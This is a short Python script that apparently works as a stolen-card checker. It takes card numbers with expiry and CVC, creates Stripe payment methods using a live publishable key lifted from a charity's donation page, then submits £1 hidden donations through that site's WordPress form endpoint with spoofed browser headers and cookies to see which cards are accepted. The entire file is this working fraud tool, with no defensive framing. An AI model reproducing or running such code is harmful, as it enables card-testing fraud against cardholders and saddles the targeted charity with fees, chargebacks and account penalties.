import requests

def Tele(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")
    
    if "20" in yy:  # Mo3gza
        yy = yy.split("20")[1]
    
    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F0f4091ba29%3B+stripe-js-v3%2F0f4091ba29%3B+card-element&referrer=https%3A%2F%2Fwww.upmo.org&time_on_page=39467&key=pk_live_51P68XSP0TfxzaK9vQS701Dx8ueFZnEDmaSFn0iDfiE1JqgL9OPVC9BuI6kw2v2FQMHWsmGICarho7eAahaKd401W00bTwnKJOd'

    try:
        r1 = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        pm = r1.json().get('id')
    except (requests.exceptions.RequestException, ValueError) as e:
        print("Error in first request:", e)
        return None

    cookies = {
        '__stripe_mid': 'e545626c-a4fb-44c6-959f-2f843c880ced825665',
        '__stripe_sid': 'd4ca2b9d-35f7-4814-b377-ffec1312562997d12b',
    }

    headers.update({
        'authority': 'www.upmo.org',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.upmo.org',
        'referer': 'https://www.upmo.org/donate/',
        'x-requested-with': 'XMLHttpRequest',
    })

    params = {
        't': '1730233749008',
    }

    data = f"data=ak_hp_textarea%3D%26ak_js%3D1730233695148%26__fluent_form_embded_post_id%3D1549%26_fluentform_3_fluentformnonce%3Dfc19b291b8%26_wp_http_referer%3D%252Fdonate%252F%26input_radio%3DOne%2520Off%26payment_input%3DCustom%2520Amount%26custom-payment-amount%3D1%26checkbox%255B%255D%3DI'd%2520like%2520to%2520add%25205%2525%2520(%25C2%25A30.10)%2520on%2520top%2520of%2520my%2520donation%2520to%2520cover%2520the%2520platform%2520fees%2520for%2520the%2520chanty.%2520Find%2520out%2520why%26checkbox%255B%255D%3DHide%2520my%2520donation%26payment_method%3Dstripe%26ak_bib%3D1730233708871%26ak_bfs%3D1730233741998%26ak_bkpc%3D1%26ak_bkp%3D3%252C930%253B%26ak_bmc%3D0%253B1%252C1970%253B0%252C1282%253B5%252C1409%253B23%252C34063%253B%26ak_bmcc%3D5%26ak_bmk%3D%26ak_bck%3D-1%253B-1%26ak_bmmc%3D1%26ak_btmc%3D2%26ak_bsc%3D2%26ak_bte%3D213%253B70%252C1894%253B112%252C1173%253B91%252C1317%253B198%252C3768%253B381%252C560%253B160%252C28998%253B%26ak_btec%3D7%26ak_bmm%3D86%252C324%253B%26__stripe_payment_method_id%3D{pm}&action=fluentform_submit&form_id=3"

    try:
        r2 = r.post('https://www.upmo.org/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
        return r2.json()
    except (requests.exceptions.RequestException, ValueError) as e:
        print("Error in second request:", e)
        return None
